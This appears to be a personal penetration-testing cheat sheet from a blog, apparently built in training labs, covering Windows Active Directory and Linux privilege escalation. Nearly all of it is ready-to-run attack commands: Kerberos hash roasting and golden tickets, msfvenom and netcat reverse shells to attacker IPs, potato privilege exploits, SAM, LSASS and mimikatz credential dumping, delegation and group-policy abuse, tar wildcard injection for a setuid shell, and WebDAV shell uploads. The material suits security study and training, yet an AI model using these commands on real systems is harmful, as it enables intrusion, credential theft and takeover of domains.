+++
date = '2026-04-28T20:19:35+09:00'
draft = false
title = 'Cheatsheet'
+++

## Kerberos

### Kerberoasting (service account)

- linux

```sh
impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```
- windows

```cmd
Rubeus.exe kerberoast /nowrap /outfile:hash /format:hashcat
```

hashcat:

`hashcat -m 13100 hash.txt /path/to/wordlist -r /usr/share/hashcat/rules/best64.rule`

### AS-REP Roasting (user account)

- windows

```powershell
.\Rubeus.exe asreproast /nowrap /outfile:hash.txt
```

- linux

```sh
impacket-GetNPUsers corp.com/dave -dc-ip 192.168.114.70
```

hashcat: 

`hashcat -m 18200 hash.txt /path/to/wordlist`

### Golden ticket

krbtgt hash is required.

- From mimikatz

```cmd
# privilege::debug
# lsadump::lsa /inject /name:krbtgt   (get SID, NTLM hash)
 # kerberos::golden /User:fakeuser123 /domain:marvel.local /sid:$SID /krbtgt:$NTLM /id:500 /ptt
# misc::cmd 
```

or get a shell using Psexec

```cmd
PsExec64.exe \\TargetMachine cmd.exe  
```

## AlwaysInstallElevated

![msi](/images/alwayselevated.png)

- msi file executed as admin

```sh
msfvenom -p windows/x64/shell_reverse_tcp -f msi -o rev.msi LHOST=192.168.45.209 LPORT=8888
```

- move it to the target server and just run it.

## Windows privileges

### SeImpersonatePrivilege

#### potato

```powershell
.\SigmaPotato.exe --revshell 192.168.45.188 4444
```

```powershell
.\godpotato.exe -cmd "nc.exe 192.168.45.246 443 -e cmd"
```

```powershell
.\JuicyPotatoNG.exe -t * -p "c:\windows\system32\cmd.exe" -a "/c C:\users\chen\nc.exe 192.168.45.226 443 -e cmd"
```

### SeBackupPrivilege

- copy SAM and SYSTEM files

```powershell
*Evil-WinRM* PS C:\users\anirudh> reg save hklm\sam ./sam
The operation completed successfully.

*Evil-WinRM* PS C:\users\anirudh> reg save hklm\system ./system
The operation completed successfully.
```

- download to kali machine

```powershell
*Evil-WinRM* PS C:\users\anirudh> download sam
Info: Downloading C:\users\anirudh\sam to sam
Info: Download successful!
*Evil-WinRM* PS C:\users\anirudh> download system
Info: Downloading C:\users\anirudh\system to system
Info: Download successful!
```

- extract credentials

```sh
impacket-secretsdump -system system -sam sam local                             
```

### SeRestorePrivilege

https://oscp.adot8.com/windows-privilege-escalation/whoami-priv/serestoreprivilege

```powershell
.\EnableSeRestorePrivilege.ps1

ren C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman.pwned
ren C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe

rdesktop 192.168.134.165
```

### SeManageVolumePrivilege

Execute the [tool](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public?source=post_page-----2ebc0077b961---------------------------------------)

### SeDebugPrivilege

- Prepare [procdump.exe](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump)

![debug](/images/etc/debugpriv.png)

- Run cmd as admin

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

- Run mimikatz as admin

```cmd
privilege::debug
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

## GPO

### ReadGMSAPassword

- target: svc_apache

```cmd
gmsapasswordreader.exe --accountname svc_apache
```

### GenericAll on Computer

![rbcd](/images/rbcd/genericall.png)

- add a fake computer

```sh
impacket-addcomputer resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'fake$' -computer-pass 'password!' -dc-ip 192.168.176.175 

[*] Successfully added machine account fake$ with password password!
```

- Delegate role

```sh
impacket-rbcd resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -delegate-from 'fake$' -delegate-to 'RESOURCEDC$' -action write -dc-ip 192.168.176.175

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] fake$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     fake$        (S-1-5-21-537427935-490066102-1511301751-4101)
```

### WriteOwner

![bloodhound](/images/vault/vault-bloodhound.png)

- make the user (anirudh) owner of the policy.

```sh
impacket-owneredit -action write -new-owner 'anirudh' -target-dn 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC' 'vault'/'anirudh':'SecureHM'
```

- give all privileges to the user

```sh
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'anirudh' -target-dn 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC' 'vault'/'anirudh':'SecureHM' -dc-ip 192.168.115.172
```

- Add the user to local admin using SharpGPOAbuse.exe

```powershell
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
```

- Update the policy

```powershell
gpupdate /force
```

### AllExtendedRights

- import powerview

```powershell
Import-Module .\PowerView.ps1
```

- reset password

```powershell
Set-DomainUserPassword -Identity 'target_user' -Verbose
```

## mimikatz

```cmd
sekurlsa::logonpasswords
sekurlsa::wdigest
lsadump::sam
lsadump::lsa
lsadump::cache
lsadump::secrets
```

- one liner

```cmd
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::lsa" "exit"
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::cache" "exit"
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::wdigest" "exit"
```

## wildcard injection

### tar

- create shell.sh file

```sh
cp /bin/bash /tmp/bash2
chmod +s /tmp/bash2
```

- create checkpoint options

```sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

### 7za

`7za a /opt/backups/backup.zip -p$password -tzip *.zip > /opt/backups/backup.log`

- link a file of interest

```sh
touch @root.zip
ln -s /root/proof.txt root.zip
```

- check the log file after executed

```sh
cat /opt/backups/backup.log 
```

## nxc

### ldap

- grep accounts

```sh
nxc ldap hutch.offsec -u '' -p '' --query "(sAMAccountName=*)" "" | grep sAMAccountName
```

- grep description

```sh
nxc ldap hutch.offsec -u '' -p '' --query "(sAMAccountName=*)" "" | grep description   
```

## ldapsearch

- make a user list

```
ldapsearch -x -H ldap://10.129.234.71 -b "dc=baby,dc=vl" | grep -i samaccountname | cut -d ':' -f 2 |tr -d ' ' > users.txt
```

- enum all properties

```
ldapsearch -x -b "dc=baby,dc=vl" "*" -H ldap://BabyDC.baby.vl
```

## webdav

### davtest

- find uploadable file type

```sh
davtest -auth fmcsorley:CrabSharkJellyfish192 -sendbd auto -url http://192.168.158.122

PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.pl
PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.html
PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.php
Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.txt
Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.aspx
Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.asp
...
```

- upload a file

```sh
davtest -auth fmcsorley:CrabSharkJellyfish192 -uploadfile rev.aspx -uploadloc DavTestDir_LOqKQmYZCD2Fd -url http://192.168.158.122
```

## SSH

### remote port forwarding (target -> kali)

- forward port 80 and 14147

```sh
ssh -N -R 80:127.0.0.1:80 -R 14147:127.0.0.1:14147 kali@192.168.45.247
```

### local port forwarding (kali -> target)

```sh
ssh -N -L 8000:127.0.0.1:8000 dev@192.168.249.150
```

## Impacket

### impacket-secretsdump

It's like a mimikatz that can be used remotely.

Admin priv accounts needed

- local admin

```sh
impacket-secretsdump marvel.local/fcastle:Password1@$IP
impacket-secretsdump administrator:@$IP -hahes :$NT
```

- domain admin

```sh
impacket-secretsdump MARVEL.local/hawkeye:'Password1'@$DC -just-dc-ntlm
```

### impacket-net

*Prepare vaild domain credentials*

[All detailed reference](https://www.hackingarticles.in/impacket-for-pentester-net/)

- user enum

```sh
impacket-net ignite.local/raj:Password@192.168.1.8 user
```

- user details

```sh
impacket-net ignite.local/raj:Password@192.168.1.8 user -name sanjeet
```

- create domain user

```sh
impacket-net ignite.local/administrator:Ignite@192.168.1.8 user -create anubhav -newPasswd Password@987
```

- enum via kerberos ticket

```sh
impacket-net ignite.local/administrator@dc.ignite.local -k -no-pass user
```

## SMB

### smbpasswd

- when SMB error message says "user must change password"

```sh
smbpasswd -r 192.168.121.123 -U testuser
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user testuser
```

## mysql

### windows

- terminal oneliner

```cmd
.\mysql.exe -uroot -e "show databases;"
```

## Bloodhound

Get domain information remotely.

Domain user account needed.

```sh
sudo bloodhound-python -d MARVEL.local -u fcastle -p Password1 -ns $DC -c all 
```

### plumhound

Automatically analyze the result of bloodhound and make a report for me.

neo4j, bloodhound must be running.

```sh
	1. Check neo4j, bloodhound are running
	2. sudo python3 PlumHound.py --easy -p {neo4j password}
	3. sudo python3 PlumHound.py -x tasks/default.tasks -p {neo4j password}  (write a report)
cd reports 
```
